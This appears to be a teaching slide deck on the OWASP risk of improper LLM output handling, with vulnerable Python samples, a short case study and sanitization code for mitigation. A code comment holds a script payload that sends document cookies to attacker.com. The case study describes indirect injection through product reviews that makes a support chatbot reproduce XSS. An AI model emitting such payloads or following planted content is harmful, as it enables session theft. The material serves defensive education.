## LLM05:2025 — Improper Output Handling
**🟠 High**

> LLM output is treated as trusted and passed directly  
> to downstream components — enabling XSS, SQLi, and RCE.

Note: The LLM is just another source of untrusted text. Its output must be treated exactly like user input — validated, sanitized, and encoded for the target context. Many developers forget this because the LLM "seems smart and safe".

--

## How It Works

**XSS via LLM-generated HTML:**

```python
# VULNERABLE — LLM output rendered without sanitization
user_message = "Summarize this article for display on our website."
llm_response = llm.complete(user_message + article_content)

# If article contains hidden attack:
# "...article text... <script>fetch('https://attacker.com?c='+document.cookie)</script>"
# LLM may reproduce the script tag verbatim
html_template = f"<div class='summary'>{llm_response}</div>"  # ← XSS!
```

**SQL injection from LLM-generated query:**
```python
# VULNERABLE — executing LLM-generated SQL directly
prompt = f"Generate a SQL query to find users named '{user_input}'"
sql = llm.complete(prompt)
db.execute(sql)   # ← LLM might include injection if manipulated
```

**Code execution:**
```python
# VULNERABLE — executing LLM-generated code
code = llm.complete("Write Python code to process this file: " + filename)
exec(code)   # ← never exec() LLM output!
```

Note: XSS = Cross-Site Scripting. RCE = Remote Code Execution. The key insight: an LLM is just another source of untrusted text — its output must be treated identically to user input. Developers often assume LLM output is "safe" because the model "understands" safety, but the model can be manipulated or can reproduce attack payloads from training data.

--

## Real-World Examples

**Indirect XSS via AI chatbot (2023)**
- LLM-powered customer support rendered markdown/HTML in responses
- Attacker embedded hidden XSS in product reviews fed to the chatbot
- Chatbot reproduced the XSS payload in its formatted response
- **Impact**: Session hijacking of support staff viewing customer conversations

Note: This attack class was documented by security researcher Johann Rehberger in 2023 across multiple AI-powered chat products. The pattern is indirect injection → output handling failure → XSS — three vulnerabilities chained. E2B = "code interpreter" microVM service for safely running LLM-generated code in isolated sandboxes. Firecracker = AWS's lightweight virtualization technology (used in AWS Lambda) for running untrusted code.

--

## Mitigation

1. **Never trust LLM output** — validate and sanitize as if from an untrusted user
2. Use **sandboxed execution** for any LLM-generated code
3. **Encode for context** — HTML escape, SQL parameterize, JSON schema validate

```python
import bleach
from markupsafe import escape

# For HTML rendering — sanitize LLM output
ALLOWED_TAGS = ['p', 'strong', 'em', 'ul', 'li', 'code']
ALLOWED_ATTRS = {}

def render_llm_response(llm_output: str) -> str:
    # Strip all HTML except safe subset
    return bleach.clean(llm_output,
                        tags=ALLOWED_TAGS,
                        attributes=ALLOWED_ATTRS,
                        strip=True)

# For structured data — validate against schema
from pydantic import BaseModel
class ProductRecommendation(BaseModel):
    product_id: str   # UUID format validated
    reason: str       # plain text, no HTML

recommendation = ProductRecommendation.model_validate_json(llm_output)
```

--

## References & Tools

| Resource | Details |
|---|---|
| [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | Output encoding |
| Bleach / DOMPurify | HTML sanitization |
| E2B / Firecracker | Sandboxed code execution |
| Pydantic / Zod | Structured output validation |
